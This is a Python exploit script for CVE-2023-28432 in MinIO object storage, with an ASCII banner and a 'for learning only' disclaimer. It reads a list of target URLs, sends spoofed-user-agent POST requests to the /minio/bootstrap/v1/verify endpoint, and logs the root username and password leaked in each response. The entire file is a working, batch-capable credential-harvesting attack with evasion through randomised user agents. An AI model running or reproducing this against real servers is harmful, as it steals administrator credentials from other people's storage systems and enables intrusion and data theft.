# -*- coding: utf-8 -*-
import json
import random
from urllib.parse import urlsplit

import httpx
from loguru import logger


def banner():
    print('''
     ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██████╗  █████╗ ██╗  ██╗██████╗ ██████╗ 
    ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ╚════██╗██╔══██╗██║  ██║╚════██╗╚════██╗
    ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗ █████╔╝╚█████╔╝███████║ █████╔╝ █████╔╝
    ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝██╔═══╝ ██╔══██╗╚════██║ ╚═══██╗██╔═══╝ 
    ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝      ███████╗╚█████╔╝     ██║██████╔╝███████╗
     ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝       ╚══════╝ ╚════╝      ╚═╝╚═════╝ ╚══════╝
                                                                            
                                                                            @Auth: C1ph3rX13
                                                                            @Blog: https://c1ph3rx13.github.io
                                                                            @Note: 代码仅供学习使用，请勿用于其他用途                                                                                                          
    ''')


def get_random_os_type():
    os_types = [
        'Windows NT 10.0; Win64; x64',
        'Windows NT 6.1; WOW64',
        'Macintosh; Intel Mac OS X 10_15_7',
        'X11; Linux x86_64'
    ]
    return random.choice(os_types)


def get_browser_version(browser_name, existing_versions):
    while True:
        major_version = random.randint(80, 120)
        minor_version = random.randint(0, 999)
        build_version = random.randint(0, 9999)
        version_string = f'{major_version}.{minor_version}.{build_version}.0'

        if version_string not in existing_versions:
            existing_versions.add(version_string)
            break

    return {
        'Chrome': f'Chrome/{version_string}',
        'Firefox': f'Firefox/{major_version}.0',
        'Safari': f'Version/{major_version}.0.0.{build_version}',
        'Edge': f'Edg/{version_string}'
    }[browser_name]


def fake_ua():
    os_type = get_random_os_type()
    browser_choice = random.choice(['Chrome', 'Firefox', 'Safari', 'Edge'])

    browser_versions = set()

    ua = f'Mozilla/5.0 ({os_type}) AppleWebKit/537.36 (KHTML, like Gecko) {get_browser_version(browser_choice, browser_versions)} Safari/537.36'

    return ua


def construct_url(scheme, netloc, path):
    return f'{scheme}://{netloc}{path}/minio/bootstrap/v1/verify'


@logger.catch
def check_url():
    checked_identifiers = set()  # 用于记录已检查过的 URL 标识符

    with open('urls.txt', 'r', encoding='utf-8') as file:
        target_urls = file.read().splitlines()

        if not target_urls:
            logger.warning("The file 'urls.txt' is empty. Please provide target URLs.")
            return

    # 定义 URL 构造函数的映射表
    url_constructors = {
        'full_url': lambda url: construct_url(parsed_url.scheme, parsed_url.netloc, parsed_url.path),
        'netloc_only': lambda url: construct_url('http', parsed_url.netloc, parsed_url.path),
        'path_with_colon': lambda url: construct_url(parsed_url.scheme, parsed_url.netloc, parsed_url.path),
        'no_scheme': lambda url: construct_url('http', parsed_url.netloc, parsed_url.path),
    }

    for target_url in target_urls:
        # 解析目标 URL
        parsed_url = urlsplit(target_url.strip())

        # 构建 URL 标识符
        identifier = 'full_url' if parsed_url.scheme and parsed_url.netloc else 'netloc_only' if parsed_url.netloc else 'path_with_colon' if ':' in parsed_url.netloc else 'no_scheme'

        # 如果已经检查过，跳过
        if identifier in checked_identifiers:
            continue

        # 构建 URL 场景
        vuln_url = url_constructors.get(identifier, lambda x: None)(parsed_url)

        if vuln_url:
            logger.info(f'Checking Url: {vuln_url}')
            send_request(vuln_url)
        else:
            logger.warning(f"Unrecognized URL format: {target_url}")
            continue

        # 将已检查过的 URL 标识符添加到集合中
        checked_identifiers.add(identifier)


@logger.catch
def send_request(url: str):
    headers = {
        'User-Agent': fake_ua(),
    }

    with httpx.Client(headers=headers, verify=False, timeout=10) as client:
        response = client.post(url=url)
        if response.status_code == httpx.codes.OK:
            response_dict = json.loads(response.text)
            minio_env = response_dict.get('MinioEnv', {})
            root_user = minio_env.get('MINIO_ROOT_USER', None)
            root_password = minio_env.get('MINIO_ROOT_PASSWORD', None)
            logger.success(f'Root User: {root_user}')
            logger.success(f'Root Password: {root_password}')
        else:
            logger.error(f'Not Vulnerable: {response.url}')
            logger.error(f'More Info: {response.headers}')


if __name__ == '__main__':
    banner()
    check_url()
